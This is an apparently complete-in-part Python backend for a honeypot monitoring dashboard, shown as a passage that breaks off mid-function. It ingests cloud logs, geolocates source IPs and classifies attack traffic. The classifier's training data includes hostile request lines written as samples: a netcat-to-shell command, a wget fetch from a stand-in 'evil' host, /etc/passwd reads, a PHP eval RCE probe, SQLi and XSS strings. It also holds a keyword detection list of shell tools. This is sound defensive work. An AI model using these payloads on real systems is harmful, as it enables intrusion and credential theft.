import asyncio
from collections import OrderedDict
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
import json
import logging as std_logging
import os
from pathlib import Path
import re
import time
from typing import Any, AsyncGenerator


def _load_dotenv_if_present() -> None:
    """カレントまたは main.py と同じフォルダの .env を読み込む（既存環境変数を優先）。"""
    candidates = [
        Path(__file__).resolve().parent / ".env",
        Path.cwd() / ".env",
    ]
    seen_paths: set[Path] = set()
    for env_path in candidates:
        resolved = env_path.resolve()
        if resolved in seen_paths or not resolved.is_file():
            continue
        seen_paths.add(resolved)
        try:
            for raw_line in resolved.read_text(encoding="utf-8").splitlines():
                line = raw_line.strip()
                if not line or line.startswith("#"):
                    continue
                if line.startswith("export "):
                    line = line[len("export ") :].strip()
                if "=" not in line:
                    continue
                key, val = line.split("=", 1)
                key = key.strip()
                val = val.strip()
                if not key or not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", key):
                    continue
                if len(val) >= 2 and (
                    (val.startswith('"') and val.endswith('"'))
                    or (val.startswith("'") and val.endswith("'"))
                ):
                    quote = val[0]
                    inner = val[1:-1]
                    if quote == '"':
                        inner = (
                            inner.replace("\\n", "\n")
                            .replace("\\r", "\r")
                            .replace('\\"', '"')
                            .replace("\\\\", "\\")
                        )
                    val = inner
                elif " #" in val:
                    val = val.split(" #", 1)[0].strip()
                if key not in os.environ:
                    os.environ[key] = val
        except OSError:
            continue


_load_dotenv_if_present()

from fastapi import FastAPI, HTTPException, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from google.cloud import bigquery as gcp_bigquery
from google.cloud import logging as gcp_logging
from google.cloud import storage as gcp_storage
import httpx
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import Pipeline

logger = std_logging.getLogger("honeypot-dashboard")

# ==========================================
# 安全上限・キャッシュ設定
# ==========================================
MAX_ALLOWED_LIMIT = int(os.getenv("MAX_ALLOWED_LIMIT", "50000"))
MAX_LOG_CACHE_ENTRIES = int(os.getenv("MAX_LOG_CACHE_ENTRIES", "128"))
MAX_GEO_CACHE_ENTRIES = int(os.getenv("MAX_GEO_CACHE_ENTRIES", "10000"))
MAX_GCS_BLOB_BYTES = int(os.getenv("MAX_GCS_BLOB_BYTES", str(10 * 1024 * 1024)))  # 10MB
MIN_STREAM_INTERVAL_SEC = 1.0

# ==========================================
# 設定・定数（Cloud Logging + GCS + BigQuery 統合）
# ==========================================
GCP_PROJECT_ID = os.getenv("GCP_PROJECT_ID", "honeypot-515503")
LOG_SOURCE_PROJECT_ID = os.getenv("LOG_SOURCE_PROJECT_ID", GCP_PROJECT_ID)

_RAW_LOG_PROJECTS = os.getenv("LOG_PROJECTS") or LOG_SOURCE_PROJECT_ID
LOG_PROJECTS: list[str] = [
    item.strip() for item in _RAW_LOG_PROJECTS.split(",") if item.strip()
]

_RAW_GCS_BUCKETS = (
    os.getenv("LOG_GCS_BUCKETS")
    or os.getenv("LOG_GCS_BUCKET")
    or "honeypot-archive-515503"
)
LOG_GCS_BUCKETS: list[str] = [
    item.strip() for item in _RAW_GCS_BUCKETS.split(",") if item.strip()
]

BQ_PROJECT_ID = os.getenv("BQ_PROJECT_ID", "honeypot-logs")
BQ_DATASET_ID = os.getenv("BQ_DATASET_ID", "honeypot_dataset")
BQ_TABLE_NAME = os.getenv("BQ_TABLE_NAME", "run_googleapis_com_stdout")
BQ_TABLE_ID = f"{BQ_PROJECT_ID}.{BQ_DATASET_ID}.{BQ_TABLE_NAME}"
ENABLE_BIGQUERY_LOGS = os.getenv("ENABLE_BIGQUERY_LOGS", "true").lower() == "true"

# "all" -> logging + gcs + bigquery / "both" -> logging + gcs / "bigquery" / "logging" / "gcs"
LOG_SOURCE_MODE = os.getenv("LOG_SOURCE_MODE", "all").strip().lower()
LOG_FILTER = os.getenv("LOG_FILTER", "").strip()
LOG_GCS_PREFIX = os.getenv("LOG_GCS_PREFIX", "").strip()
MAX_GCS_BLOBS = min(max(int(os.getenv("MAX_GCS_BLOBS", "200")), 1), 2000)
MAX_TIMELINE_EVENTS = min(
    max(int(os.getenv("MAX_TIMELINE_EVENTS", str(MAX_ALLOWED_LIMIT))), 1),
    MAX_ALLOWED_LIMIT,
)

USD_TO_JPY = float(os.getenv("USD_TO_JPY", "152.0"))
STREAM_INTERVAL_SEC = max(
    float(os.getenv("STREAM_INTERVAL_SEC", "3.0")), MIN_STREAM_INTERVAL_SEC
)
LOG_CACHE_TTL = max(float(os.getenv("LOG_CACHE_TTL", "5.0")), 1.0)

_RAW_ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "").strip()
ALLOWED_ORIGINS: list[str] = (
    [o.strip() for o in _RAW_ALLOWED_ORIGINS.split(",") if o.strip()]
    if _RAW_ALLOWED_ORIGINS
    else []
)

LOG_RESPONSE_CACHE: OrderedDict[
    tuple[Any, ...],
    tuple[float, dict[str, Any]],
] = OrderedDict()

SKIP_CRAWLERS = os.getenv("SKIP_CRAWLERS", "true").lower() == "true"
SKIP_GOOGLE_LLC = os.getenv("SKIP_GOOGLE_LLC", "true").lower() == "true"
SKIP_PRIVATE_IPS = os.getenv("SKIP_PRIVATE_IPS", "true").lower() == "true"
SKIP_SYSTEM_NOISE = os.getenv("SKIP_SYSTEM_NOISE", "true").lower() == "true"
SKIP_JAPAN_IPS = os.getenv("SKIP_JAPAN_IPS", "true").lower() == "true"

_RAW_IGNORED_IPS = os.getenv("IGNORED_IPS", "").strip()
IGNORED_IPS: set[str] = (
    {x.strip() for x in _RAW_IGNORED_IPS.split(",") if x.strip()}
    if _RAW_IGNORED_IPS
    else set()
)
IGNORED_PREFIXES: tuple[str, ...] = tuple(
    p.strip() for p in os.getenv("IGNORED_PREFIXES", "").split(",") if p.strip()
)

GEO_CACHE: OrderedDict[str, dict[str, Any]] = OrderedDict()
GEO_SUCCESS_TTL = float(os.getenv("GEO_SUCCESS_TTL", str(60 * 60 * 24)))
GEO_ERROR_TTL = float(os.getenv("GEO_ERROR_TTL", "20.0"))

COUNTRY_JA_MAP: dict[str, str] = {
    "US": "アメリカ",
    "CN": "中国",
    "RU": "ロシア",
    "IN": "インド",
    "BR": "ブラジル",
    "DE": "ドイツ",
    "NL": "オランダ",
    "SG": "シンガポール",
    "JP": "日本",
    "KR": "韓国",
    "GB": "イギリス",
    "FR": "フランス",
    "VN": "ベトナム",
    "ID": "インドネシア",
    "ZA": "南アフリカ",
    "BE": "ベルギー",
    "HK": "香港",
    "TW": "台湾",
    "CA": "カナダ",
    "AU": "オーストラリア",
    "UA": "ウクライナ",
    "TH": "タイ",
    "MY": "マレーシア",
    "PH": "フィリピン",
    "IT": "イタリア",
    "ES": "スペイン",
    "SE": "スウェーデン",
    "CH": "スイス",
    "PL": "ポーランド",
    "TR": "トルコ",
    "AE": "アラブ首長国連邦",
    "SA": "サウジアラビア",
    "MX": "メキシコ",
    "AR": "アルゼンチン",
    "NZ": "ニュージーランド",
}

CRAWLER_UA_KEYWORDS = (
    "googlebot",
    "google-lens",
    "google-inspectiontool",
    "adsbot-google",
    "apis-google",
    "mediapartners-google",
    "bingbot",
    "yandexbot",
    "duckduckbot",
    "baiduspider",
    "slurp",
    "applebot",
    "uptime",
    "googlehc",
)

SYSTEM_NOISE_EVENTS = {
    "heartbeat",
    "start",
    "stop",
    "ping",
}

SYSTEM_NOISE_PATTERNS = (
    "gce agent stopped",
    "error watching metadata",
    "no shutdown scripts to run",
    "starting shutdown scripts",
    "completed adding/removing routes",
    "network interface setup disabled",
    "systemd-",
    "dhclient",
    "cloud-init",
    "startup-script",
    "finished running startup scripts",
    "startup-script exit status",
    "osconfig agent",
    "logging.googleapis.com/diagnostic",
    "credential helper for gcr registries",
    "configuring supplied registries",
    "adding config for registries",
    '"event": "heartbeat"',
    '"event": "start"',
    '"event": "ping"',
    '"message": "ping"',
)

_CONTROL_CHAR_RE = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]")


def _safe_float(val: Any, default: float = 0.0) -> float:
    if val is None or isinstance(val, bool):
        return default
    try:
        res = float(val)
        return res if np.isfinite(res) else default
    except (ValueError, TypeError):
        return default


def _safe_int(val: Any, default: int = 0) -> int:
    if val is None or isinstance(val, bool):
        return default
    try:
        return int(val)
    except (ValueError, TypeError):
        return default


def sanitize_display_text(text: Any, max_len: int = 1200) -> str:
    if text is None:
        return ""
    s = str(text)
    s = _CONTROL_CHAR_RE.sub("", s)
    if len(s) > max_len:
        return s[:max_len] + "…(truncated)"
    return s


def _is_japan_geo(geo: dict[str, Any]) -> bool:
    cc = str(geo.get("country_code") or "").strip().upper()
    ja_name = str(geo.get("country_ja") or "").strip()
    en_name = str(geo.get("country") or "").strip().lower()
    return cc == "JP" or ja_name == "日本" or en_name == "japan"


def _is_google_llc(geo: dict[str, Any], user_agent: str = "", raw_text: str = "") -> bool:
    isp = str(geo.get("isp") or "").strip().lower()
    ua = (user_agent or "").strip().lower()
    raw_l = (raw_text or "").strip().lower()
    return (
        "google" in isp
        or any(k in ua for k in ("googlebot", "google-lens", "googlehc", "apis-google"))
        or "google-lens" in raw_l
        or "googleusercontent.com" in raw_l
    )


def _is_private_or_non_public_ip(ip: str, geo: dict[str, Any] | None = None) -> bool:
    ip_clean = (ip or "").strip().lower()
    if not ip_clean or ip_clean == "private" or not is_public_ipv4(ip_clean):
        return True
    if geo:
        country = str(geo.get("country") or "").strip().lower()
        country_ja = str(geo.get("country_ja") or "").strip()
        if country in {"private / local", "ローカル", "プライベート"} or country_ja in {
            "ローカル",
            "プライベート",
        }:
            return True
    return False


CLASSIFIER_PIPELINE: Pipeline | None = None
ANOMALY_MODEL: IsolationForest | None = None


def init_ml_models() -> None:
    global CLASSIFIER_PIPELINE, ANOMALY_MODEL

    train_samples = [
        ("POST /boaform/admin/formSysCmd nc 45.90.163.37 4545 | sh", "RCE / Command Injection"),
        ("POST /cgi-bin/luci/;stok=/locale cmd=wget http://evil/sh", "RCE / Command Injection"),
        ("GET /shell?cmd=cat+/etc/passwd;+uname+-a", "RCE / Command Injection"),
        ("POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?>", "RCE / Command Injection"),
        ("GET /boaform/admin/formPing?target_addr=127.0.0.1|busybox", "RCE / Command Injection"),
        ("POST / process.mainModule.require child_process spawn /bin/sh", "RCE / Command Injection"),
        ("SetIamPolicy service-agent-manager", "RCE / Command Injection"),
        ("GET /.env HTTP/1.1", "Credential / Env Theft"),
        ("GET /.git/config HTTP/1.1", "Credential / Env Theft"),
        ("GET /config.json aws_secret_access_key", "Credential / Env Theft"),
        ("GET /backup.sql.gz db_password", "Credential / Env Theft"),
        ("GET /aws/credentials .ssh/id_rsa", "Credential / Env Theft"),
        ("GET /test-path HoneypotTest curl", "Credential / Env Theft"),
        ("POST /wp-login.php log=admin&pwd=password123", "CMS / Admin Brute Force"),
        ("GET /xmlrpc.php wp.getUsersBlogs", "CMS / Admin Brute Force"),
        ("GET /phpmyadmin/index.php", "CMS / Admin Brute Force"),
        ("POST /admin/login username=root&password=admin", "CMS / Admin Brute Force"),
        ("GET /search?id=1' UNION SELECT 1,user(),database()--", "SQLi / XSS Probe"),
        ("GET /index.php?page=1 OR 1=1", "SQLi / XSS Probe"),
        ("GET /?q=<script>alert(document.cookie)</script>", "SQLi / XSS Probe"),
        ("GET /../../../../etc/passwd", "SQLi / XSS Probe"),
        ("SetIamPolicy Service account does not exist concurrent policy changes", "SQLi / XSS Probe"),
        ("GET / cortex-xpanse scanning-activity", "Automated Recon / Scanner"),
        ("GET / mglndd bad_request 400", "Automated Recon / Scanner"),
        ("GET /robots.txt python-requests/2.31.0", "Automated Recon / Scanner"),
        ("GET /favicon.ico zgrab/0.x", "Automated Recon / Scanner"),
        ("GET /sitemap.xml masscan/1.3", "Automated Recon / Scanner"),
        ("HEAD / HTTP/1.1 nuclei", "Automated Recon / Scanner"),
        ("CreateSink honeypot-http-to-bq", "Automated Recon / Scanner"),
    ]

    texts = [x[0] for x in train_samples]
    labels = [x[1] for x in train_samples]

    pipeline = Pipeline(
        [
            ("tfidf", TfidfVectorizer(ngram_range=(1, 2), lowercase=True)),
            ("nb", MultinomialNB(alpha=0.3)),
        ]
    )
    pipeline.fit(texts, labels)
    CLASSIFIER_PIPELINE = pipeline

    baseline_features = np.array(
        [
            [12, 0, 5, 1],
            [18, 20, 6, 2],
            [10, 0, 4, 1],
            [24, 45, 7, 3],
            [15, 10, 5, 2],
            [30, 60, 8, 4],
            [14, 5, 5, 1],
            [22, 30, 6, 2],
        ],
        dtype=np.float64,
    )
    detector = IsolationForest(n_estimators=100, contamination=0.15, random_state=42)
    detector.fit(baseline_features)
    ANOMALY_MODEL = detector


def _get_ready_models() -> tuple[Pipeline, IsolationForest]:
    if CLASSIFIER_PIPELINE is None or ANOMALY_MODEL is None:
        init_ml_models()
    assert CLASSIFIER_PIPELINE is not None
    assert ANOMALY_MODEL is not None
    return CLASSIFIER_PIPELINE, ANOMALY_MODEL


def classify_and_score(
    event_type: str,
    method: str,
    path: str,
    payload: str,
    user_agent: str,
    raw_request_line: str = "",
    header_count: int = 6,
) -> tuple[str, float, int]:
    classifier, detector = _get_ready_models()

    signal_text = f"{event_type} {method} {path} {payload} {raw_request_line} {user_agent}".strip()[:4096]
    probs = classifier.predict_proba([signal_text])[0]
    classes = classifier.classes_
    best_idx = int(np.argmax(probs))
    category = str(classes[best_idx])
    confidence = round(float(probs[best_idx]) * 100.0, 1)

    lower_sig = signal_text.lower()
    if any(
        k in lower_sig
        for k in (
            "formsyscmd",
            "nc ",
            "|sh",
            "| sh",
            "wget ",
            "curl ",
            "busybox",
            "/etc/passwd",
            "process.mainmodule",
            "child_process",
            "spawn(",
            "/bin/sh",
            "/bin/bash",
        )
    ):
        category = "RCE / Command Injection"
        confidence = max(confidence, 88.0)
    elif any(k in lower_sig for k in (".env", ".git", "credentials", "id_rsa", "actuator")):
        if category == "Automated Recon / Scanner":
            category = "Credential / Env Theft"
            confidence = max(confidence, 82.0)
    elif event_type == "bad_request" or "xpanse" in lower_sig or "mglndd" in lower_sig:
        if category == "Credential / Env Theft":
            category = "Automated Recon / Scanner"

    special_chars = len(re.findall(r"['\";|<>$`\\{}\[\]\.\./]", f"{path} {payload} {raw_request_line}"[:4096]))
    features = np.array(
        [[min(len(path), 4096), min(len(payload), 8192), max(0, min(_safe_int(header_count, 6), 200)), special_chars]],
        dtype=np.float64,
    )
    raw_score = float(detector.decision_function(features)[0])
    anomaly_pct = int(np.clip((0.35 - raw_score) * 140.0, 5, 99))
    if event_type == "bad_request" or category == "RCE / Command Injection":
        anomaly_pct = max(anomaly_pct, 78)

    return category, confidence, anomaly_pct


def code_to_flag(country_code: str) -> str:
    code = (country_code or "").strip().upper()
    if len(code) != 2 or not code.isalpha():
        return "🌐"
    return "".join(chr(127397 + ord(c)) for c in code)


def is_public_ipv4(ip: str) -> bool:
    s = (ip or "").strip()
    if s.startswith("::ffff:"):
        s = s.removeprefix("::ffff:")
    if not s or s.lower() in {"127.0.0.1", "0.0.0.0", "unknown", "private", "localhost"}:
        return False
    if s.startswith(("10.", "192.168.", "169.254.")):
        return False
    if s.startswith("172."):
        parts = s.split(".")
        if len(parts) >= 2 and parts[1].isdigit() and 16 <= int(parts[1]) <= 31:
            return False
    if not re.fullmatch(r"(?:\d{1,3}\.){3}\d{1,3}", s):
        return False
    return all(0 <= int(octet) <= 255 for octet in s.split("."))


def _extract_first_ipv4(text: Any) -> str | None:
    if not text:
        return None
    s = str(text)[:2048]
    for token in re.split(r"[,\s]+", s):
        candidate = token.strip().strip('"').strip("'")
        if candidate.startswith("::ffff:"):
            candidate = candidate.removeprefix("::ffff:")
        if is_public_ipv4(candidate):
            return candidate
    m = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", s)
    if m and is_public_ipv4(m.group(0)):
        return m.group(0)
    return None


def _normalize_geo_entry(raw_geo: dict[str, Any] | None, ip: str = "") -> dict[str, Any]:
    geo = raw_geo or {}
    cc = str(geo.get("country_code") or "").strip().upper()
    en_name = sanitize_display_text(geo.get("country") or "", max_len=100).strip()
    ja_name = sanitize_display_text(geo.get("country_ja") or "", max_len=100).strip()

    ip_clean = (ip or "").strip().lower()
    if ip_clean == "private":
        return {
            "country": "Private / Local",
            "country_ja": "プライベート",
            "country_code": "",
            "flag": "🏠",
            "lat": 0.0,
            "lon": 0.0,
            "isp": sanitize_display_text(geo.get("isp") or "Private Network", max_len=150),
        }

    if cc in COUNTRY_JA_MAP:
        ja_name = COUNTRY_JA_MAP[cc]
    elif not ja_name and en_name:
        ja_name = en_name
    elif not ja_name:
        ja_name = "Unknown"

    if not en_name:
        en_name = ja_name

    flag = str(geo.get("flag") or "").strip()
    computed_flag = code_to_flag(cc)
    if computed_flag != "🌐":
        flag = computed_flag
    elif not flag or flag == "🌐":
        if en_name in {"Private / Local", "ローカル", "プライベート"} or ja_name in {
            "Private / Local",
            "ローカル",
            "プライベート",
        }:
            flag = "🏠"
        else:
            flag = "🌐"

    return {
        "country": en_name,
        "country_ja": ja_name,
        "country_code": cc,
        "flag": flag,
        "lat": _safe_float(geo.get("lat", 0.0), 0.0),
        "lon": _safe_float(geo.get("lon", 0.0), 0.0),
        "isp": sanitize_display_text(geo.get("isp") or "Unknown ISP", max_len=150),
    }


def _get_cached_geo(ip: str, now_mono: float) -> dict[str, Any] | None:
    entry = GEO_CACHE.get(ip)
    if not entry:
        return None
    ttl = GEO_ERROR_TTL if entry.get("is_error") else GEO_SUCCESS_TTL
    if (now_mono - _safe_float(entry.get("resolved_at", 0.0), 0.0)) < ttl:
        GEO_CACHE.move_to_end(ip)
        return _normalize_geo_entry(entry.get("data"), ip=ip)
    return None


def _set_cached_geo(ip: str, data: dict[str, Any], is_error: bool, now_mono: float) -> None:
    GEO_CACHE[ip] = {
        "resolved_at": now_mono,
        "is_error": is_error,
        "data": _normalize_geo_entry(data, ip=ip),
    }
    GEO_CACHE.move_to_end(ip)
    while len(GEO_CACHE) > MAX_GEO_CACHE_ENTRIES:
        GEO_CACHE.popitem(last=False)


async def resolve_geoip_batch(ips: list[str]) -> dict[str, dict[str, Any]]:
    now_mono = time.monotonic()
    unique_ips = list(dict.fromkeys(ips))
    result_map: dict[str, dict[str, Any]] = {}
    uncached: list[str] = []

    for ip in unique_ips:
        cached = _get_cached_geo(ip, now_mono)
        if cached is not None:
            result_map[ip] = cached
            continue
        if is_public_ipv4(ip):
            uncached.append(ip)
        elif (ip or "").strip().lower() == "private":
            data = {
                "country": "Private / Local",
                "country_ja": "プライベート",
                "country_code": "",
                "flag": "🏠",
                "lat": 0.0,
                "lon": 0.0,
                "isp": "Private Network",
            }
            _set_cached_geo(ip, data, is_error=False, now_mono=now_mono)
            result_map[ip] = _normalize_geo_entry(data, ip=ip)
        else:
            data = {
                "country": "Private / Local",
                "country_ja": "ローカル",
                "country_code": "",
                "flag": "🏠",
                "lat": 35.68,
                "lon": 139.76,
                "isp": "Internal Network",
            }
            _set_cached_geo(ip, data, is_error=False, now_mono=now_mono)
            result_map[ip] = _normalize_geo_entry(data, ip=ip)

    if uncached:
        batches = [uncached[i : i + 100] for i in range(0, len(uncached), 100)]
        resolved_in_batch: set[str] = set()

        async with httpx.AsyncClient(timeout=8.0) as client:
            for batch in batches:
                req_body = [
                    {
                        "query": ip,
                        "fields": "status,country,countryCode,lat,lon,isp,query",
                    }
                    for ip in batch
                ]
                for attempt in range(2):
                    try:
                        resp = await client.post("http://ip-api.com/batch", json=req_body)
                        if resp.status_code == 429 and attempt == 0:
                            await asyncio.sleep(1.5)
                            continue
                        resp.raise_for_status()
                        items = resp.json()
                        if isinstance(items, list):
                            for item in items:
                                if not isinstance(item, dict):
                                    continue
                                q_ip = str(item.get("query") or "").strip()
                                if not q_ip:
                                    continue
                                if item.get("status") == "success":
                                    cc = str(item.get("countryCode") or "").strip().upper()
                                    en_name = str(item.get("country") or "").strip() or "Unknown"
                                    ja_name = COUNTRY_JA_MAP.get(cc, en_name)
                                    data = {
                                        "country": en_name,
                                        "country_ja": ja_name,
                                        "country_code": cc,
                                        "flag": code_to_flag(cc),
                                        "lat": _safe_float(item.get("lat", 0.0), 0.0),
                                        "lon": _safe_float(item.get("lon", 0.0), 0.0),
                                        "isp": item.get("isp") or "Unknown ISP",
                                    }
                                    _set_cached_geo(q_ip, data, is_error=False, now_mono=now_mono)
                                    result_map[q_ip] = _normalize_geo_entry(data, ip=q_ip)
                                    resolved_in_batch.add(q_ip)
                        break
                    except httpx.HTTPError as exc:
                        if attempt == 0:
                            await asyncio.sleep(0.8)
                            continue
                        logger.warning("GeoIP batch lookup failed: %s", exc)

        for ip in uncached:
            if ip not in resolved_in_batch:
                fallback_data = {
                    "country": "Unknown",
                    "country_ja": "不明",
                    "country_code": "",
                    "flag": "🌐",
                    "lat": 0.0,
                    "lon": 0.0,
                    "isp": "Unknown ISP",
                }
                _set_cached_geo(ip, fallback_data, is_error=True, now_mono=now_mono)
                result_map[ip] = _normalize_geo_entry(fallback_data, ip=ip)

    return result_map


def _extract_user_agent(data: dict[str, Any], http_req: dict[str, Any]) -> str:
    if data.get("user_agent"):
        return sanitize_display_text(data["user_agent"], max_len=300)
    headers = data.get("headers")
    if isinstance(headers, dict):
        for k, v in headers.items():
            if str(k).lower() == "user-agent":
                if isinstance(v, list) and v:
                    return sanitize_display_text(v[0], max_len=300)
                return sanitize_display_text(v or "", max_len=300)
    req_meta = data.get("requestMetadata")
    if isinstance(req_meta, dict) and req_meta.get("callerSuppliedUserAgent"):
        return sanitize_display_text(req_meta["callerSuppliedUserAgent"], max_len=300)
    if http_req.get("userAgent"):
        return sanitize_display_text(http_req["userAgent"], max_len=300)
    return ""


def _parse_json_dict(raw_val: Any) -> dict[str, Any] | None:
    if isinstance(raw_val, dict):
        return raw_val
    if isinstance(raw_val, str):
        stripped = raw_val.strip()
        if len(stripped) <= 200_000 and stripped.startswith("{") and stripped.endswith("}"):
            try:
                parsed = json.loads(stripped)
                if isinstance(parsed, dict):
                    return parsed
            except json.JSONDecodeError:
                return None
    return None


def _is_ignored_ip(ip: str) -> bool:
    cleaned = (ip or "").strip()
    if not cleaned:
        return False
    if SKIP_PRIVATE_IPS and _is_private_or_non_public_ip(cleaned):
        return True
    if IGNORED_IPS and cleaned in IGNORED_IPS:
        return True
    if IGNORED_PREFIXES and any(cleaned.startswith(prefix) for prefix in IGNORED_PREFIXES):
        return True
    return False


def _should_skip_record(
    src_ip: str,
    event_type: str,
    user_agent: str,
    path: str,
    raw_text: str,
) -> bool:
    if _is_ignored_ip(src_ip):
        return True

    lower_text = raw_text.lower()
    ua_lower = user_agent.lower()
    ev_lower = (event_type or "").strip().lower()

    if SKIP_SYSTEM_NOISE:
        if ev_lower in SYSTEM_NOISE_EVENTS:
            return True
        if any(pat in lower_text for pat in SYSTEM_NOISE_PATTERNS):
            return True
        if (src_ip or "").strip().lower() in {"", "private", "unknown", "0.0.0.0"} and ev_lower in {
            "text",
            "gce",
            "syslog",
        }:
            return True

    if SKIP_CRAWLERS or SKIP_GOOGLE_LLC:
        if any(kw in ua_lower for kw in CRAWLER_UA_KEYWORDS):
            return True
        if SKIP_GOOGLE_LLC and ("google-lens" in lower_text or "googleusercontent.com" in lower_text):
            return True
        if path in {"/healthz", "/favicon.ico"} and not ua_lower and event_type != "bad_request":
            return True

    return False


def _extract_ip_from_dict(d: dict[str, Any], http_req: dict[str, Any]) -> str:
    for key in (
        "src_ip",
        "remote_ip",
        "client_ip",
        "source_ip",
        "peer_ip",
        "remote_addr",
        "x_forwarded_for",
        "ip",
    ):
        val = d.get(key)
        extracted = _extract_first_ipv4(val)
        if extracted:
            return extracted

    headers = d.get("headers")
    if isinstance(headers, dict):
        for h_key in ("x-forwarded-for", "x-real-ip", "cf-connecting-ip", "true-client-ip"):
            for k, v in headers.items():
                if str(k).lower() == h_key:
                    extracted = _extract_first_ipv4(v)
                    if extracted:
                        return extracted

    req_meta = d.get("requestMetadata")
    if isinstance(req_meta, dict):
        extracted = _extract_first_ipv4(req_meta.get("callerIp"))
        if extracted:
            return extracted

    http_ip = _extract_first_ipv4(http_req.get("remoteIp"))
    if http_ip:
        return http_ip

    return "private"


def _parse_timestamp_str(val: Any, fallback_dt: datetime) -> datetime:
    if isinstance(val, datetime):
        return val if val.tzinfo else val.replace(tzinfo=timezone.utc)
    if isinstance(val, str) and val.strip():
        s = val.strip().replace("Z", "+00:00")
        try:
            dt = datetime.fromisoformat(s)
            return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)
        except ValueError:
            pass
    return fallback_dt


def _build_record_from_dict_and_meta(
    target_dict: dict[str, Any],
    http_req: dict[str, Any],
    ts_dt: datetime,
    fallback_ip: str = "private",
    fallback_event: str = "request",
) -> dict[str, Any] | None:
    src_ip = _extract_ip_from_dict(target_dict, http_req)
    if src_ip == "private" and fallback_ip and fallback_ip != "private":
        src_ip = fallback_ip
    if src_ip == "private":
        for text_key in ("raw_request_line", "payload", "body", "message"):
            found = _extract_first_ipv4(target_dict.get(text_key))
            if found:
                src_ip = found
                break

    event_type = sanitize_display_text(
        target_dict.get("event")
        or target_dict.get("event_type")
        or target_dict.get("methodName")
        or fallback_event,
        max_len=80,
    ).lower()
    method = sanitize_display_text(
        target_dict.get("method") or http_req.get("requestMethod") or "GET",
        max_len=20,
    )
    path = sanitize_display_text(
        target_dict.get("path") or http_req.get("requestUrl") or "/",
        max_len=500,
    )
    raw_req_line = sanitize_display_text(target_dict.get("raw_request_line") or "", max_len=500).strip()
    body_val = (
        target_dict.get("payload")
        or target_dict.get("body")
        or target_dict.get("message")
        or ""
    )
    headers_obj = target_dict.get("headers")

    full_json_str = json.dumps(target_dict, ensure_ascii=False, default=str)
    if raw_req_line or body_val:
        parts = [p for p in (raw_req_line, str(body_val) if body_val else "") if p]
        payload_str = f"{' | '.join(parts)} || RAW: {full_json_str}"
    else:
        payload_str = full_json_str

    payload_safe = sanitize_display_text(payload_str, max_len=1200)
    ua = _extract_user_agent(target_dict, http_req)
    header_cnt = (
        len(headers_obj)
        if isinstance(headers_obj, dict)
        else _safe_int(target_dict.get("header_count", 6), 6)
    )
    raw_text_for_filter = f"{event_type} {path} {payload_safe} {ua}"

    if _should_skip_record(src_ip, event_type, ua, path, raw_text_for_filter):
        return None

    return {
        "timestamp": ts_dt.isoformat(),
        "event_type": event_type,
        "ip": src_ip,
        "method": method,
        "path": path,
        "payload": payload_safe,
        "raw_request_line": raw_req_line,
        "user_agent": ua,
        "header_count": header_cnt,
        "bytes": len(raw_text_for_filter.encode("utf-8")) + 160,
    }


def _obj_to_record(obj: Any, blob_updated: datetime, cutoff_dt: datetime) -> dict[str, Any] | None:
    if isinstance(obj, dict):
        raw_http_req = obj.get("httpRequest")
        http_req: dict[str, Any] = raw_http_req if isinstance(raw_http_req, dict) else {}

        nested_raw = (
            _parse_json_dict(obj.get("jsonPayload"))
            or (obj.get("jsonPayload") if isinstance(obj.get("jsonPayload"), dict) else None)
            or _parse_json_dict(obj.get("message"))
        )
        target_dict: dict[str, Any] = nested_raw if isinstance(nested_raw, dict) else obj

        ts_raw = (
            obj.get("timestamp")
            or obj.get("receiveTimestamp")
            or target_dict.get("timestamp")
            or target_dict.get("time")
        )
        ts_dt = _parse_timestamp_str(ts_raw, blob_updated)
        if ts_dt < cutoff_dt:
            return None

        fallback_ip = _extract_ip_from_dict(obj, http_req)
        fallback_event = str(obj.get("event") or obj.get("methodName") or "request").lower()
        return _build_record_from_dict_and_meta(
            target_dict=target_dict,
            http_req=http_req,
            ts_dt=ts_dt,
            fallback_ip=fallback_ip,
            fallback_event=fallback_event,
        )

    if isinstance(obj, str) and obj.strip():
        if blob_updated < cutoff_dt:
            return None
        line = sanitize_display_text(obj.strip(), max_len=1200)
        src_ip = _extract_first_ipv4(line) or "private"
        if _should_skip_record(src_ip, "text", "", "/", line):
            return None
        return {
            "timestamp": blob_updated.isoformat(),
            "event_type": "text",
            "ip": src_ip,
            "method": "GET",
            "path": "/",
            "payload": line,
            "raw_request_line": "",
            "user_agent": "",
            "header_count": 6,
            "bytes": len(line.encode("utf-8")) + 160,
        }

    return None


def _entry_to_record(entry: Any, cutoff_dt: datetime) -> dict[str, Any] | None:
    ts_dt = _parse_timestamp_str(
        getattr(entry, "timestamp", None),
        datetime.now(timezone.utc),
    )
    if ts_dt < cutoff_dt:
        return None

    payload_raw = getattr(entry, "payload", None)
    http_req_raw = getattr(entry, "http_request", None)
    http_req: dict[str, Any] = http_req_raw if isinstance(http_req_raw, dict) else {}

    if isinstance(payload_raw, dict):
        target_dict: dict[str, Any] = payload_raw
    elif isinstance(payload_raw, str):
        parsed = _parse_json_dict(payload_raw)
        target_dict = parsed if parsed is not None else {"message": payload_raw}
    else:
        target_dict = {}

    fallback_ip = "private"
    labels = getattr(entry, "labels", None)
    if isinstance(labels, dict):
        for lbl_key in ("src_ip", "remote_ip", "client_ip", "ip"):
            found = _extract_first_ipv4(labels.get(lbl_key))
            if found:
                fallback_ip = found
                break

    fallback_event = str(getattr(entry, "log_name", None) or "request").lower()
    return _build_record_from_dict_and_meta(
        target_dict=target_dict,
        http_req=http_req,
        ts_dt=ts_dt,
        fallback_ip=fallback_ip,
        fallback_event=fallback_event,
    )


def _parse_blob_text_to_records(
    content: str,
    blob_updated: datetime,
    cutoff_dt: datetime,
    max_records: int,
) -> list[dict[str, Any]]:
    stripped = content.strip()
    if not stripped or max_records <= 0:
        return []

    out: list[dict[str, Any]] = []

    if stripped.startswith("["):
        try:
